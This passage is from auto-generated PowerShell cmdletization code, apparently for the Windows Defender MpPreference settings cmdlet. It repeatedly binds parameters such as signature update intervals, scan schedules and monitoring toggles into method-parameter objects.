[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\r\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\r\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartup"
"WithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\r\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPathUpdateAtScheduledTimeOnly')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPathUpdateAtScheduledTimeOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\r\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\r\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableConvertWarnToBlock')) {\r\n          [object]$__cmdletization_value = ${EnableConvertWarnToBlock}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\r\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {\r\n          [object]$__cmdletization_value = ${MAPSReporting}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\r\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitS"
"amplesConsentType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\r\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\r\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\r\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\r\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\r\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\r\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\r\n          [object]$__cmdletization_value = ${DisableScriptScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 